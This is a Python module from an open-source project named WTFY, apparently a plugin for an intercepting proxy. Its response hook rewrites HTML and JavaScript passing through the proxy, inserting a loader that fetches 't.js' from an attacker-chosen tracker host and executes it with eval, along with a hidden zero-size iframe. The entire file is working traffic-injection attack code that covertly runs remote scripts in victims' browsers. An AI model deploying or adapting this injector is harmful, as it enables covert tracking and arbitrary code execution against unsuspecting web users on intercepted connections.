#
# Author: Gregory Fleischer (gfleischer@gmail.com)
#
# Copyright (c) 2012 Gregory Fleischer
#
# This file is part of WTFY.
#
# WTFY is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# WTFY is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with WTFY.  If not, see <http://www.gnu.org/licenses/>.
#
import re
import time

class TrackerInjection(object):
    def __init__(self, tracker_host, verbose = False, targets = None):
        self.verbose = verbose
        self.tracker_host = tracker_host
        if targets is not None:
            self.all_targets = False
            self.targets = targets
        else:
            self.all_targets = True
            self.targets = []
      
        self.script_injection_content = '''
(function(){
    var t = "//%s/t.js";
    try {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", t, true);
        xhr.setRequestHeader("X-CrossSite", "1");
	xhr.onreadystatechange = function(){
	    if (4 == xhr.readyState) {
//alert(xhr.responseText);
		eval(xhr.responseText);
	    }
	}
	xhr.send(null);
    } catch(e) {
alert(e);
	var ts = document.createElement("script");
	ts.src = t;
	ts.type = "text/javascript";
	ts.defer = ts.async = true;
        var s = document.getElementsByTagName('script')[0]; 
        s.parentNode.insertBefore(ts, s);
    }
})();''' % (tracker_host)
        self.html_injection_content = r'<script>%s</script><iframe src="//%s/t.html" height="0" width="0" frameBorder="0"></iframe>' % (self.script_injection_content, tracker_host)
#        self.script_injection_content = r'(function(){if (!!window.trackid){var s = document.createElement("script");}})()'
        self.re_inject_html = re.compile(r'(</html|</body)', re.I)

    def on_request(self, hostname, ip_address, method, resource, version, headers, body):
        if self.verbose:
            print ('on_request', hostname, method, resource, headers, body)
        context = { 'request_start_time' : time.time() }
        return (headers, body, context)

    def on_response(self, hostname, headers, body, context):
        if self.verbose:
            print ('on_response', headers, body)
        if hostname == self.tracker_host:
            pass
        elif self.all_targets or hostname in self.targets:
            # process
            body = self.inject_response_content(headers, body)
        return (headers, body)

    def inject_response_content(self, headers, body):
        content_type = headers.get('content-type')
        if not content_type:
            content_type = 'text/html'
        if ';' in content_type:
            content_type, junk  = content_type.split(';', 1)
        content_type = content_type.strip()
        if 'html' in content_type:
            m = self.re_inject_html.search(body)
            body = self.re_inject_html.sub(self.perform_html_injection, body, 1)
        elif 'javascript' in content_type:
            body = body + self.script_injection_content

        if headers.has_key('content-length'):
            headers['content-length'] = len(body)

        return body

    def perform_html_injection(self, m):
        return self.html_injection_content + m.group(1)

